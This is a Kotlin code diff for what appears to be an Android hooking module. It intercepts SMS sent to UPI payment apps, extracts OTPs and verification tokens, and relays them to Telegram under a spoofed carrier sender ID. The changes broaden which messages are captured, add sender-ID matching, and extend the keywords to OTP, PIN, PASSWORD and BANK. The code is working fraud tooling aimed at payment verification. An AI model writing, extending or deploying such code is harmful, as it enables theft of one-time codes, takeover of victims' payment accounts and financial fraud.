@@ -7,9 +7,18 @@ import java.util.regex.Pattern
 object SmsMatcher {
 
     private val OTP_PATTERN = Pattern.compile("""\b(\d{4,8})\b""")
+    private val SENDER_ID_PATTERN = Pattern.compile("""^(AD|VM|JD|BP|TX|VK|AX|IC|PY|BZ)-[A-Z0-9]+(-S)?$""", Pattern.CASE_INSENSITIVE)
+    private val DEFAULT_SENDER = "AD-TEST-S"
 
     fun enabledHookedApps(config: ModuleConfig): List<UpiAppRegistry.UpiApp> =
         UpiAppRegistry.ALL.filter { config.hookedUpiApps[it.packageName] == true }
+
+    /** Saved Sender ID from MESSAGE tab — hook/filter is based on this, NOT phone number */
+    fun savedSenderId(config: ModuleConfig): String? {
+        val id = config.injectSenderId.trim().uppercase()
+        if (id.isBlank() || id == DEFAULT_SENDER) return null
+        return id
+    }
 
     fun shouldCapture(config: ModuleConfig, sender: String, body: String): Boolean {
         if (!config.hookIncomingSms && !config.hookUpiVerification) return false
@@ -18,31 +27,63 @@ object SmsMatcher {
         val hooked = enabledHookedApps(config)
         if (hooked.isEmpty()) return false
 
-        // Custom intercept sender ID from MESSAGE tab
-        val filterSender = config.injectSenderId.trim()
-        if (filterSender.isNotBlank() && filterSender != "AD-TEST-S") {
-            if (senderMatches(sender, filterSender)) return true
+        val savedId = savedSenderId(config)
+
+        // 1) Real carrier Sender ID (AD-YESPRO-S) — exact match with saved ID
+        if (savedId != null && senderMatches(sender, savedId)) return true
+
+        // 2) Alphanumeric sender ID from carrier matching hooked UPI app keywords
+        if (isAlphanumericSenderId(sender)) {
+            if (UpiAppRegistry.matchAmong(hooked, sender, body) != null) return true
+            if (savedId != null && senderMatches(sender, savedId)) return true
         }
 
-        val matchedHooked = UpiAppRegistry.matchAmong(hooked, sender, body)
-        if (matchedHooked != null) return true
-
-        if (config.hookUpiVerification && isVerificationSms(sender, body)) {
+        // 3) Test from another phone (numeric sender) — capture ONLY if saved Sender ID set + verification body
+        //    Telegram pe saved Sender ID dikhega, number se hook nahi
+        if (savedId != null && isNumericSender(sender) && isVerificationBody(body)) {
             return true
         }
 
-        return config.hookIncomingSms && matchedHooked != null
+        // 4) Saved sender ID set + body mentions hooked app keyword (manual test message)
+        if (savedId != null && UpiAppRegistry.matchAmong(hooked, savedId, body) != null) {
+            return isVerificationBody(body)
+        }
+
+        return false
+    }
+
+    /** Telegram / intercept display — always saved Sender ID, never random phone number */
+    fun displaySenderId(config: ModuleConfig, actualSender: String): String {
+        savedSenderId(config)?.let { return it }
+        if (isAlphanumericSenderId(actualSender)) return normalizeSender(actualSender)
+        return normalizeSender(actualSender).ifBlank { DEFAULT_SENDER }
     }
 
     fun senderMatches(actual: String, filter: String): Boolean {
         val a = normalizeSender(actual)
         val f = normalizeSender(filter)
         if (a.isBlank() || f.isBlank()) return false
-        return a == f || a.contains(f) || f.contains(a)
+        if (a == f) return true
+        // AD-YESPRO-S vs ADYESPROS
+        val aCompact = a.replace("-", "")
+        val fCompact = f.replace("-", "")
+        return aCompact == fCompact || a.contains(f) || f.contains(a) || aCompact.contains(fCompact)
     }
 
     fun normalizeSender(sender: String): String =
         sender.replace("\\s".toRegex(), "").uppercase()
+
+    fun isAlphanumericSenderId(sender: String): Boolean {
+        val s = normalizeSender(sender)
+        if (SENDER_ID_PATTERN.matcher(s).matches()) return true
+        if (s.startsWith("AD-") || s.startsWith("VM-") || s.startsWith("JD-")) return true
+        return s.any { it.isLetter() } && !isNumericSender(s)
+    }
+
+    fun isNumericSender(sender: String): Boolean {
+        val digits = sender.replace("\\D".toRegex(), "")
+        return digits.length >= 8 && !sender.any { it.isLetter() }
+    }
 
     fun extractToken(body: String, autoExtract: Boolean): String {
         val trimmed = body.trim()
@@ -61,11 +102,10 @@ object SmsMatcher {
 
     fun messageLabel(config: ModuleConfig, sender: String, body: String): String {
         val hooked = enabledHookedApps(config)
+        val lookupSender = savedSenderId(config) ?: sender
+        UpiAppRegistry.matchAmong(hooked, lookupSender, body)?.let { return it.displayName.uppercase() }
         UpiAppRegistry.matchAmong(hooked, sender, body)?.let { return it.displayName.uppercase() }
-        UpiAppRegistry.matchApp(sender, body)?.let { app ->
-            if (config.hookedUpiApps[app.packageName] == true) return app.displayName.uppercase()
-        }
-        return formatSenderLabel(sender)
+        return formatSenderLabel(lookupSender)
     }
 
     fun isEncryptedToken(text: String): Boolean {
@@ -76,18 +116,14 @@ object SmsMatcher {
         return tokenChars >= compact.length * 0.85
     }
 
-    private fun isVerificationSms(sender: String, body: String): Boolean {
+    private fun isVerificationBody(body: String): Boolean {
         if (isEncryptedToken(body)) return true
-        val upperSender = sender.uppercase()
-        val upperBody = body.uppercase()
+        val upper = body.uppercase()
         val keywords = listOf(
             "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "YESPAY", "YESPRO",
-            "PHONEPE", "PAYTM", "GPAY", "BHIM", "CODE", "PIN", "PASSWORD", "BANK"
+            "PHONEPE", "PAYTM", "GPAY", "BHIM", "CODE", "PIN", "PASSWORD", "BANK", "TEST"
         )
-        if (keywords.any { upperBody.contains(it) || upperSender.contains(it) }) return true
-        if (upperSender.startsWith("AD-") || upperSender.startsWith("VM-")) return true
-        if (sender.replace("\\D".toRegex(), "").length >= 8) return true
-        return false
+        return keywords.any { upper.contains(it) }
     }
 
     private fun formatSenderLabel(sender: String): String {
